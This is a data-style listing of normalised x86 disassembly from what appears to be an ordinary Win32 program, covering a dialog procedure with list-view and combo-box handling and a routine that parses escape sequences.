mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov [ ecx ] eax
lea eax [ esp + 0x28 ]
push eax
mov ecx ebp
call sub_401c60
mov eax [ esp + 0x100c0 ]
cmp [ eax ] 0x0
mov ebx eax
mov [ esp + 0x18 ] ebx
je r-xdata
mov eax [ eax ]
mov edi [ ebp + 0x14 ]
add edi ecx
mov [ edx ] edi
cmp [ ebp + 0x18 ] esi
push ecx
mov ecx esp
jb r-xdata
mov ecx [ esp + 0x100b0 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x100ac
retn
mov al [ ebx ]
mov cl al
xor cl 0x20
add cl 0x5f
cmp cl 0x3b
ja r-xdata
cmp al 0x5c
jne r-xdata
add ebx 0x2
jmp r-xdata
xor eax eax
mov al [ ebx ]
mov ecx ebp
push eax
push 0x1
call sub_4017f0
inc ebx
mov al [ ebx + 0x1 ]
cmp al 0x5c
jne r-xdata
mov [ esp + 0x18 ] ebx
cmp al 0x30
jl r-xdata
inc ebx
mov [ esp + 0x18 ] ebx
jmp r-xdata
cmp al 0x76
jne r-xdata
cmp al 0x39
jg r-xdata
cmp [ ebx + 0x2 ] 0x28
jne r-xdata
movsx ecx al
mov eax [ esp + 0x100c4 ]
mov edi [ eax + 0x4 ]
sub ecx 0x30
test edi edi
jne r-xdata
xor esi esi
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] esi
mov [ esp + 0x28 ] 0x0
lea edx [ esp + 0x10 ]
lea ecx [ ebx + 0x3 ]
xor ebp ebp
push edx
mov [ esp + 0x100bc ] esi
mov [ esp + 0x1a ] 0x0
mov [ esp + 0x1b ] 0x0
mov [ esp + 0x20 ] ebp
mov [ esp + 0x14 ] ecx
call sub_445f00
mov eax [ esp + 0x14 ]
mov cl [ eax ]
add esp 0x4
cmp cl 0x2d
jne r-xdata
mov esi [ eax + 0x8 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
cmp [ eax ] 0x30
jne r-xdata
inc eax
mov [ esp + 0x16 ] 0x1
mov [ esp + 0x10 ] eax
imul ecx ecx 0x1c
push 0xffffffff
add ecx edi
push 0x0
push ecx
mov ecx ebp
call sub_4018c0
add ebx 0x2
jmp r-xdata
cmp ecx edx
jge r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
inc eax
mov [ esp + 0x17 ] 0x1
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x10 ]
push eax
call sub_445f00
mov ecx [ esp + 0x14 ]
mov al [ ecx ]
add esp 0x4
cmp al 0x2c
jne r-xdata
jmp r-xdata
lea ecx [ esp + 0x24 ]
mov [ esp + 0x100b8 ] 0xffffffff
call sub_4480e0
mov ebp [ esp + 0x100c8 ]
mov eax ecx
lea edx [ esp + 0x10 ]
inc eax
push edx
mov [ esp + 0x14 ] eax
call sub_445f00
mov edi [ esp + 0x14 ]
mov al [ edi ]
add esp 0x4
cmp al 0x5c
jne r-xdata
cmp cl 0x39
jg r-xdata
cmp al 0x40
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al 0x30
mov [ esp + 0x10 ] edi
jl r-xdata
mov [ esp + 0x10 ] eax
movsx ecx cl
lea edx [ ebp + ebp * 4 ]
lea edx [ ecx + edx * 2 - 0x30 ]
mov cl [ eax + 0x1 ]
inc eax
cmp cl 0x30
mov [ esp + 0x1c ] edx
mov ebp edx
jge r-xdata
lea edx [ esp + 0x10 ]
push edx
call sub_445f00
mov eax [ esp + 0x14 ]
mov cl [ eax ]
add esp 0x4
cmp cl 0x29
jne r-xdata
xor bl bl
mov [ esp + 0x5c ] 0xf
mov [ esp + 0x58 ] esi
mov [ esp + 0x48 ] bl
mov al [ edi ]
cmp al 0x29
mov [ esp + 0x100b8 ] 0x1
je r-xdata
cmp al 0x39
jg r-xdata
mov bl [ esp + 0x17 ]
test bl bl
mov bl [ esp + 0x16 ]
sete cl
dec cl
and cl 0x10
add cl 0x20
mov [ esp + 0x20 ] cl
mov ecx [ esp + 0x38 ]
mov esi ebp
mov ebp [ esp + 0x20 ]
sub esi ecx
test bl bl
jne r-xdata
mov ecx [ esp + 0x100cc ]
push ecx
lea edx [ esp + 0x48 ]
push 0xffffffff
push edx
call sub_40e460
add esp 0xc
test bl bl
je r-xdata
test al al
je r-xdata
mov ebx [ esp + 0x100c4 ]
movsx esi al
mov ecx ebx
sub esi 0x30
call sub_4010c0
cmp esi eax
jge r-xdata
mov eax [ esp + 0x1c ]
test eax eax
jle r-xdata
test esi esi
jle r-xdata
push 0xffffffff
push esi
lea ecx [ esp + 0x4c ]
push ecx
lea ecx [ esp + 0x30 ]
call sub_4018c0
lea ecx [ esp + 0x44 ]
mov [ esp + 0x100b8 ] 0x0
call sub_4480e0
lea ecx [ esp + 0x84 ]
call sub_438500
cmp [ esp + 0x5c ] 0x10
mov eax [ esp + 0x48 ]
mov [ esp + 0x100b8 ] 0x2
jae r-xdata
mov [ esp + 0x10 ] edi
cmp al 0x20
je r-xdata
mov ebx [ esp + 0x18 ]
mov eax [ ebx + 0x4 ]
imul esi esi 0x1c
push 0xffffffff
add esi eax
push 0x0
push esi
lea ecx [ esp + 0x30 ]
call sub_4018c0
inc edi
mov [ esp + 0x10 ] edi
jmp r-xdata
mov ecx [ esp + 0x100c8 ]
push 0xffffffff
push 0x0
lea eax [ esp + 0x2c ]
push eax
call sub_4018c0
test esi esi
jge r-xdata
mov edi esi
push eax
lea ecx [ esp + 0x88 ]
call j_sub_44f660
mov [ esp + 0x80 ] 0xf
mov [ esp + 0x7c ] esi
mov [ esp + 0x6c ] 0x0
mov [ esp + 0x60 ] 0x76
lea eax [ esp + 0x60 ]
push eax
lea ecx [ esp + 0x88 ]
mov [ esp + 0x100bc ] 0x3
call sub_439260
lea ecx [ esp + 0x60 ]
call sub_40c960
push eax
lea ecx [ esp + 0x48 ]
call sub_402510
lea ecx [ esp + 0x60 ]
call sub_40ba70
lea ecx [ esp + 0x84 ]
mov [ esp + 0x100b8 ] 0x1
call sub_44f5f0
lea eax [ esp + 0x48 ]
cmp al 0x9
je r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x3c ]
inc ecx
cmp eax 0x10
mov [ esp + 0x18 ] ecx
mov [ esp + 0x100b8 ] 0xffffffff
jb r-xdata
mov edi [ esp + 0x100c8 ]
lea ecx [ esp + 0x24 ]
push eax
call sub_401f60
cmp bl 0x1
jne r-xdata
mov ecx [ esp + 0x100c8 ]
push ebp
push 0x1
call sub_4017f0
dec edi
jne r-xdata
cmp al 0x61
jl r-xdata
mov ebx [ esp + 0x18 ]
mov ebp [ esp + 0x100c8 ]
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
jmp r-xdata
mov edx [ esp + 0x28 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
lea esp [ esp ]
cmp [ esp + 0x3c ] 0x10
mov eax [ esp + 0x28 ]
jae r-xdata
mov edi [ esp + 0x100c8 ]
push 0xffffffff
push 0x0
lea edx [ esp + 0x2c ]
push edx
mov ecx edi
call sub_4018c0
jmp r-xdata
mov bl 0x1
cmp al 0x7a
jle r-xdata
cmp [ ebx ] 0x0
jne r-xdata
push ebp
push 0x1
mov ecx edi
call sub_4017f0
dec esi
jne r-xdata
mov ecx [ esp + 0x100c8 ]
sub eax esi
push eax
call sub_402010
jmp r-xdata
lea eax [ esp + 0x28 ]
test esi esi
jle r-xdata
mov [ esp + 0x40 ] al
mov eax [ esp + 0x40 ]
push eax
push 0x1
lea ecx [ esp + 0x4c ]
inc edi
call sub_4017f0
mov al [ edi ]
cmp al 0x29
jne r-xdata
cmp bl 0x1
jne r-xdata
sub_446430
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0472
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x8d0
cmp eax 0x4e
push ebx
push ebp
push esi
push edi
ja r-xdata
sub eax 0x110
je r-xdata
je r-xdata
mov ecx [ esp + 0x8f0 ]
or eax 0xffffffff
xor ebp ebp
push 0xdd5
push ecx
mov [ rw-data ] ebp
mov [ rw-data ] 0x0
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ esp + 0x1c ] ebp
call [ GetDlgItem@IAT ]
mov edi [ SendMessageA@IAT ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] ebp
mov edi edi
dec eax
jne r-xdata
cmp [ esp + 0x8f8 ] 0xdcd
jne r-xdata
sub eax 0x2
je r-xdata
mov ecx ebx
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
xor eax eax
mov esi [ esp + 0x8f8 ]
movzx eax si
cmp eax 0x4f0
jg r-xdata
mov eax 0x1
jmp r-xdata
mov esi [ esp + 0x8fc ]
mov eax [ esi + 0x8 ]
cmp eax 0xffffff9b
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
sub eax 0x3
jne r-xdata
test esi esi
je r-xdata
cmp [ esi + ebp + 0x18 ] 0x10
jb r-xdata
cmp [ esp + 0x1c ] edx
jge r-xdata
cmp eax 0xdd5
jne r-xdata
cmp eax 0x4ee
jge r-xdata
mov ecx [ esp + 0x8e0 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x8dc
retn 0x10
cmp eax 0xfffffffd
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov [ rw-data ] 0x0
mov eax 0x1
jmp r-xdata
push eax
call sub_4b4da0
add esp 0x4
mov eax [ esp + 0x8fc ]
mov edx [ rw-data ]
mov ebx [ SetWindowPos@IAT ]
movzx esi ax
shr eax 0x10
push 0x6
mov edi eax
lea eax [ edi - 0x78 ]
push eax
lea ecx [ esi - 0x18 ]
push ecx
push 0x0
push 0x0
push 0x0
push edx
call ebx
mov ebp [ esp + 0x8f0 ]
lea ecx [ esi - 0xf0 ]
mov eax 0x55555556
imul ecx
push 0x4
push 0x16
mov eax edx
push 0x78
shr eax 0x1f
add edx eax
add edi 0xffffffe2
push edi
mov esi edx
push esi
push 0x0
push 0x1
push ebp
call [ GetDlgItem@IAT ]
push eax
call ebx
push 0x4
push 0x16
push 0x78
push edi
lea ecx [ esi + esi + 0x82 ]
push ecx
push 0x0
push 0x2
push ebp
call [ GetDlgItem@IAT ]
push eax
call ebx
mov eax 0x1
jmp r-xdata
mov edx [ esp + 0x8f0 ]
push 0xdd6
push edx
call [ GetDlgItem@IAT ]
xor ebp ebp
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] ebp
jmp r-xdata
sub ebx esi
mov eax 0x92492493
imul ebx
add edx ebx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x2c ] edx
je r-xdata
lea esi [ esi + ebp + 0x4 ]
mov esi [ esi + ebp + 0x4 ]
jmp r-xdata
shr esi 0x10
cmp si 0x5
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
dec eax
je r-xdata
cmp eax 0xffffff97
jne r-xdata
mov edx [ esi + 0xc ]
mov eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax 0x1
jmp r-xdata
mov esi [ rw-data ]
test esi esi
mov ebx [ rw-data ]
jne r-xdata
mov esi [ esp + 0x18 ]
push 0x0
push 0x0
push 0x14e
push esi
call edi
mov ecx [ esp + 0x8f0 ]
push esi
push 0x10dd5
push 0x111
push ecx
call edi
mov [ esp + 0x14 ] 0x1
mov esi [ rw-data ]
test esi esi
mov ebx [ rw-data ]
jne r-xdata
mov ecx [ esp + 0x18 ]
push esi
push 0x0
push 0x143
push ecx
call edi
inc [ esp + 0x1c ]
add ebp 0x1c
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp si 0x1
jne r-xdata
mov esi [ esp + 0x8f0 ]
mov edi [ GetDlgItemTextA@IAT ]
push 0x200
lea edx [ esp + 0x3e0 ]
push edx
push 0xdd5
push esi
call edi
push 0x200
lea eax [ esp + 0xdc ]
push eax
push 0xdd6
push esi
call edi
mov al [ esp + 0x3dc ]
test al al
je r-xdata
mov eax [ rw-data ]
test eax eax
mov ebp [ SendMessageA@IAT ]
je r-xdata
dec eax
jne r-xdata
cmp eax 0xffffff96
jne r-xdata
mov eax [ rw-data ]
push 0x0
push 0x0
push 0x1018
push eax
call [ SendMessageA@IAT ]
mov ecx [ esi + 0x10 ]
push sub_445a40
push 0xfffffffc
push eax
mov [ rw-data ] eax
mov [ rw-data ] ecx
call [ SetWindowLongA@IAT ]
mov [ rw-data ] eax
mov eax 0x1
jmp r-xdata
mov ecx ebx
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ebp [ GetDlgItem@IAT ]
xor ebx ebx
or edi 0xffffffff
cmp si 0x1
mov esi [ esp + 0x8f0 ]
mov [ esp + 0x3dc ] bl
jne r-xdata
push eax
call sub_4b4da0
add esp 0x4
mov [ rw-data ] 0x0
mov al [ esp + 0xd8 ]
test al al
je r-xdata
push 0xdd5
push esi
call [ GetDlgItem@IAT ]
mov ecx rw-data
mov ebp eax
call sub_4010c0
mov edi eax
xor esi esi
test edi edi
jle r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x1004
push ecx
call ebp
mov ebx eax
xor esi esi
test ebx ebx
jle r-xdata
mov eax [ rw-data ]
push 0x0
push 0xffffffff
push 0x1017
push eax
call ebp
mov edx [ esp + 0x8f0 ]
push 0x2
push edx
call [ EndDialog@IAT ]
mov eax 0x1
jmp r-xdata
mov eax [ rw-data ]
xor esi esi
cmp eax esi
je r-xdata
test esi esi
je r-xdata
cmp [ esi + ebp + 0x18 ] 0x10
jb r-xdata
cmp [ esp + 0x1c ] edx
jge r-xdata
push 0x200
lea edx [ esp + 0x3e0 ]
push edx
push 0xdd5
push esi
call [ GetDlgItemTextA@IAT ]
push ebx
push ebx
push 0x147
push 0xdd5
push esi
call ebp
push eax
call [ SendMessageA@IAT ]
cmp eax edi
je r-xdata
mov edi [ esp + 0x8f8 ]
cmp di 0x4f0
jne r-xdata
mov eax [ esp + 0x8f0 ]
push 0xdd6
push eax
call [ GetDlgItem@IAT ]
mov [ esp + 0x28 ] eax
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp edi 0x14
jge r-xdata
xor ebx ebx
jmp r-xdata
mov ecx [ esp + 0x8f0 ]
push 0x1
push ecx
call [ EndDialog@IAT ]
mov eax 0x1
jmp r-xdata
xor edi edi
jmp r-xdata
mov ecx [ rw-data ]
mov edi [ SendMessageA@IAT ]
lea eax [ esp + 0x30 ]
push eax
lea edx [ esp + 0x7e0 ]
push ecx
mov [ esp + 0x4c ] edx
mov edx [ rw-data ]
push 0x102d
push edx
mov [ esp + 0x48 ] esi
mov [ esp + 0x58 ] 0x104
call edi
mov ecx [ rw-data ]
push 0x104
lea eax [ esp + 0x2dc ]
push eax
push ecx
call [ GetWindowTextA@IAT ]
lea edx [ esp + 0x2d8 ]
push edx
lea eax [ esp + 0x7e0 ]
push eax
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x8f0 ]
push 0xdcd
push edx
call [ GetDlgItem@IAT ]
xor ebx ebx
push ebx
push ebx
mov esi eax
push 0x1037
push esi
call edi
or eax 0x21
push eax
push ebx
push 0x1036
push esi
call edi
lea eax [ esp + 0x30 ]
push eax
push ebx
push 0x101b
push esi
mov [ esp + 0x40 ] 0xf
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] 0x140
mov [ esp + 0x4c ] r--data
mov [ esp + 0x54 ] ebx
call edi
lea ecx [ esp + 0x30 ]
push ecx
mov ebp 0x1
push ebp
push 0x101b
push esi
mov [ esp + 0x44 ] ebp
mov [ esp + 0x48 ] 0x28
mov [ esp + 0x4c ] r--data
mov [ esp + 0x54 ] ebp
call edi
lea edx [ esp + 0x30 ]
push edx
push 0x2
push 0x101b
push esi
mov [ esp + 0x44 ] ebp
mov [ esp + 0x48 ] 0x28
mov [ esp + 0x4c ] r--data
mov [ esp + 0x54 ] 0x2
call edi
lea eax [ esp + 0x30 ]
push eax
push 0x3
push 0x101b
push esi
mov [ esp + 0x48 ] 0x50
mov [ esp + 0x4c ] r--data
mov [ esp + 0x54 ] 0x3
call edi
lea ecx [ esp + 0x30 ]
push ecx
push 0x4
push 0x101b
push esi
mov [ esp + 0x48 ] 0x78
mov [ esp + 0x4c ] r--data
mov [ esp + 0x54 ] 0x4
call edi
mov ebp [ rw-data ]
cmp ebp [ rw-data ]
mov [ esp + 0x18 ] ebx
mov [ esp + 0x10 ] ebp
je r-xdata
sub ebx esi
mov eax 0x92492493
imul ebx
add edx ebx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x2c ] edx
je r-xdata
lea esi [ esi + ebp + 0x4 ]
mov esi [ esi + ebp + 0x4 ]
jmp r-xdata
push ebx
push 0x4ee
push esi
call ebp
mov edi [ EnableWindow@IAT ]
push eax
call edi
push ebx
push 0x4ef
push esi
call ebp
push eax
call edi
push ebx
push 0x4f0
push esi
call ebp
push eax
call edi
lea eax [ esp + 0x3dc ]
push eax
call sub_4b55f0
add esp 0x4
test eax eax
mov [ rw-data ] eax
je r-xdata
mov al [ esp + 0x3dc ]
test al al
je r-xdata
mov edx [ rw-data ]
imul eax eax 0x1c
mov ecx [ eax + edx + 0x18 ]
add eax edx
cmp ecx 0x10
jb r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov esi [ esp + 0x8f0 ]
push 0x4f3
push esi
mov [ esp + 0x70 ] eax
mov [ esp + 0x60 ] ecx
mov [ esp + 0x34 ] edx
call [ IsDlgButtonChecked@IAT ]
test eax eax
setne [ esp + 0x27 ]
cmp di 0x4ef
jne r-xdata
mov eax [ esp + 0x8f0 ]
push 0xdcd
push eax
call [ GetDlgItem@IAT ]
mov edi [ SendMessageA@IAT ]
xor ebx ebx
push ebx
push 0xffffffff
mov esi eax
push 0x1017
push esi
mov [ esp + 0x38 ] esi
call edi
push ebx
push ebx
push 0x1004
push esi
call edi
cmp eax ebx
mov [ esp + 0x68 ] eax
mov [ esp + 0x20 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x10 ] ebx
jle r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
mov ebp edx
xor ebp ebp
jmp r-xdata
lea ebx [ edi - 0x1 ]
inc edi
push edi
mov ecx rw-data
call sub_421f10
mov ecx [ rw-data ]
lea edx [ esp + 0x3dc ]
lea eax [ ebx + ecx ]
push edx
push eax
call sub_401380
add esp 0x8
test al al
jne r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0x30 ]
push eax
push esi
push 0x102d
lea edx [ esp + 0x3e8 ]
push ecx
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x58 ] 0x200
mov [ esp + 0x54 ] edx
call ebp
mov eax [ rw-data ]
lea edx [ esp + 0x3dc ]
push edx
lea ecx [ edi + eax ]
call sub_402510
inc esi
add edi 0x20
cmp esi ebx
jl r-xdata
mov [ rw-data ] 0xffffffff
mov [ rw-data ] esi
mov eax 0x1
jmp r-xdata
lea ecx [ esp + 0x2d8 ]
push ecx
call [ lstrlenA@IAT ]
test eax eax
je r-xdata
mov ebp [ esp + 0x14 ]
mov edi [ esp + 0x8f0 ]
mov ebx [ GetDlgItem@IAT ]
push sub_445ca0
push 0xfffffffc
push esi
mov [ rw-data ] esi
call [ SetWindowLongA@IAT ]
push ebp
push 0x4ee
push edi
mov [ rw-data ] eax
call ebx
mov esi [ EnableWindow@IAT ]
push eax
call esi
push ebp
push 0x4ef
push edi
call ebx
push eax
call esi
push ebp
push 0x4f0
push edi
call ebx
push eax
call esi
push 0xdd5
push edi
call ebx
push eax
call [ SetFocus@IAT ]
mov ebx [ wsprintfA@IAT ]
add ebp 0x4
mov [ esp + 0x1c ] ebp
mov ecx [ esp + 0x18 ]
push 0x0
push 0x0
push 0x14e
push ecx
call edi
mov ecx [ esp + 0x18 ]
push esi
push 0x0
push 0x143
push ecx
call edi
inc [ esp + 0x1c ]
add ebp 0x1c
jmp r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov ebx 0x1
add eax 0x4
push eax
lea ecx [ esp + 0x3e0 ]
push ecx
call [ lstrcpyA@IAT ]
jmp r-xdata
mov eax [ eax + 0x4 ]
push eax
lea ecx [ esp + 0x3e0 ]
push ecx
call [ lstrcpyA@IAT ]
jmp r-xdata
push 0xdcd
push esi
call [ GetDlgItem@IAT ]
mov ebp [ SendMessageA@IAT ]
xor edi edi
push edi
push edi
mov ebx eax
push 0x1004
push ebx
call ebp
mov cl [ esp + 0x27 ]
test cl cl
mov ecx [ rw-data ]
mov [ rw-data ] 0x1
je r-xdata
mov eax [ rw-data ]
or ecx 0xffffffff
cmp eax ecx
je r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
push ecx
push edx
lea eax [ esp + 0x2e0 ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov edx [ esp + 0x900 ]
add esp 0x10
push 0x0
push r--data
lea ecx [ esp + 0x2e0 ]
push ecx
push edx
call [ MessageBoxA@IAT ]
mov eax 0x1
jmp r-xdata
lea ecx [ ecx ]
cmp ebp 0x14
jge r-xdata
xor ebx ebx
jmp r-xdata
xor edi edi
test ebp ebp
jle r-xdata
lea eax [ esp + 0x3dc ]
lea edx [ eax + 0x1 ]
jmp r-xdata
mov esi ebx
imul esi esi 0x1c
mov edi ebx
test esi esi
mov ebx esi
je r-xdata
inc esi
add ebx 0x1c
cmp esi edi
jl r-xdata
mov al [ esp + 0x2d8 ]
test al al
lea ecx [ esp + 0x2d8 ]
je r-xdata
mov [ esp + 0x28 ] ebp
mov edx [ ebp ]
mov [ esp + 0x28 ] edx
jmp r-xdata
cmp ecx edi
jge r-xdata
cmp ecx eax
jl r-xdata
mov edx [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] edx
mov [ rw-data ] ecx
mov [ rw-data ] ecx
mov [ rw-data ] ecx
mov eax esi
lea edx [ eax + 0x1 ]
nop
lea edi [ ebp - 0x1 ]
sub esp 0x1c
mov eax esp
inc ebp
mov [ esp + 0x48 ] esp
mov [ eax + 0x18 ] 0xf
mov [ eax + 0x14 ] 0x0
push ebp
mov ecx rw-data
mov [ eax + 0x4 ] 0x0
call sub_421e10
mov edx [ rw-data ]
lea eax [ esp + 0xd8 ]
lea ecx [ ebx + edx ]
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov eax [ rw-data ]
push 0xffffffff
lea ecx [ esi + eax ]
lea eax [ ecx - 0x1c ]
push 0x0
push eax
call sub_401dd0
sub esi 0x1c
dec edi
jne r-xdata
cmp esi 0xffffffff
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
lea edx [ esp + 0xb0 ]
push edx
lea ecx [ esp + 0x2dc ]
push eax
mov [ esp + 0xcc ] ecx
mov ecx [ rw-data ]
push 0x102e
push ecx
mov [ esp + 0xc8 ] esi
call edi
mov al [ ecx ]
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
mov eax ebp
mov eax [ ebp ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov [ esp + 0x1c ] eax
mov [ esp + 0x28 ] 0x1
mov esi eax
xor ecx ecx
or esi 0xffffffff
mov [ esp + 0x1c ] esi
mov [ esp + 0x28 ] esi
jmp r-xdata
lea ecx [ eax - 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ esp + 0x74 ]
call sub_401cc0
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
xor edi edi
cmp ecx eax
jge r-xdata
sub eax esi
push eax
push esi
lea ecx [ esp + 0xb8 ]
call sub_401e80
push 0xffffffff
push 0x0
lea edx [ esp + 0xb8 ]
push edx
lea ecx [ esp + 0x78 ]
call sub_4018c0
test ebx ebx
je r-xdata
lea eax [ esp + 0xd8 ]
lea edx [ eax + 0x1 ]
mov esi edi
imul esi esi 0x1c
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edx [ ecx + 0x14 ]
sub eax esi
push eax
lea eax [ esp + 0xdc ]
push eax
push edx
push 0x0
call sub_401150
test eax eax
je r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x3e0 ]
push ecx
mov ecx [ rw-data ]
call sub_401e80
mov esi [ SendMessageA@IAT ]
push 0x0
push ebx
push 0x144
push ebp
call esi
lea edx [ esp + 0x3dc ]
push edx
push 0x0
push 0x14a
push ebp
call esi
push 0x0
push 0x0
push 0x14e
push ebp
call esi
test ebx ebx
jle r-xdata
cmp al 0x5c
je r-xdata
add ecx 0x2
jmp r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ rw-data ]
mov eax [ edx + ecx * 4 ]
mov [ esp + 0x2c ] eax
call sub_40af00
mov ecx [ esp + 0x2c ]
push eax
push 0x0
call sub_4440b0
push eax
lea ecx [ esp + 0xdc ]
push r--data
push ecx
call ebx
add esp 0xc
lea eax [ esp + 0x88 ]
push eax
push 0x0
push 0x1006
lea edx [ esp + 0xe4 ]
push esi
mov [ esp + 0xac ] edx
mov [ esp + 0xa0 ] 0x1
call edi
mov ecx [ ebp + 0x18 ]
mov edx [ rw-data ]
mov eax [ edx + ecx * 4 ]
mov [ esp + 0x2c ] eax
call sub_40af00
mov ecx [ esp + 0x2c ]
push eax
push 0x0
call sub_444100
push eax
lea ecx [ esp + 0xdc ]
push r--data
push ecx
call ebx
add esp 0xc
lea eax [ esp + 0x88 ]
push eax
push 0x0
push 0x1006
lea edx [ esp + 0xe4 ]
push esi
mov [ esp + 0xac ] edx
mov [ esp + 0xa0 ] 0x2
call edi
jmp r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x2c ] edx
jne r-xdata
push eax
call sub_457f40
mov ecx [ esp + 0x2c ]
add esp 0x4
add eax ecx
lea ecx [ esp + 0x88 ]
push ecx
push 0x0
mov [ esp + 0xa4 ] eax
mov eax [ esp + 0x20 ]
push 0x1007
push esi
mov [ esp + 0x9c ] eax
mov [ esp + 0xa0 ] 0x0
call edi
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp ecx esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov [ esp + 0x14 ] ecx
cmp [ esp + 0xc8 ] 0x10
jb r-xdata
mov ecx [ esp + 0x1c ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x84 ]
inc ecx
cmp eax 0x10
mov [ esp + 0x1c ] ecx
mov [ esp + 0x90 ] edi
jb r-xdata
xor esi esi
xor ebx ebx
xor ebp ebp
cmp edi esi
mov [ esp + 0x5c ] ebx
mov [ esp + 0x60 ] ebp
mov [ esp + 0x64 ] esi
jle r-xdata
cmp ebx ebp
mov esi ebx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0xdc ]
push ecx
mov ecx [ rw-data ]
call sub_401e80
mov edi [ esp + 0x28 ]
mov esi [ SendMessageA@IAT ]
push 0x0
dec ebp
push ebp
push 0x144
push edi
call esi
lea edx [ esp + 0xd8 ]
push edx
push 0x0
push 0x14a
push edi
call esi
push 0x0
push 0x0
push 0x14e
push edi
call esi
mov eax [ rw-data ]
push 0xffffffff
lea ecx [ esi + eax ]
lea eax [ ecx - 0x1c ]
push 0x0
push eax
call sub_401dd0
sub esi 0x1c
dec edi
jne r-xdata
test edi edi
je r-xdata
inc edi
add ebx 0x1c
cmp edi ebp
jl r-xdata
mov eax [ esp + 0x8f0 ]
push 0x10
push r--data
push r--data
push eax
call [ MessageBoxA@IAT ]
cmp al 0x2f
je r-xdata
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov ecx [ rw-data ]
add eax 0x20
add ebp 0x20
inc edx
cmp eax ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x1c ] ebp
mov [ esp + 0x18 ] edx
jne r-xdata
mov ecx [ esp + 0x1c ]
mov ebp [ ecx + 0x18 ]
mov edx [ rw-data ]
imul ebp ebp 0x70
mov eax [ ebp + edx + 0x4c ]
add ebp edx
test eax eax
jle r-xdata
cmp ecx esi
mov [ rw-data ] ecx
jne r-xdata
lea edx [ esp + 0x30 ]
push edx
push ecx
push 0x102d
lea eax [ esp + 0x5e8 ]
push ebx
mov [ esp + 0x48 ] edi
mov [ esp + 0x58 ] 0x200
mov [ esp + 0x54 ] eax
call ebp
lea eax [ esp + 0x5dc ]
push eax
call [ lstrlenA@IAT ]
mov cl [ esp + 0x27 ]
test cl cl
mov [ esp + 0x20 ] edi
je r-xdata
jmp r-xdata
cmp ebx edi
mov [ esp + 0xc8 ] 0xf
mov [ esp + 0xc4 ] edi
mov [ esp + 0xb4 ] 0x0
je r-xdata
mov edx [ esp + 0xb4 ]
push edx
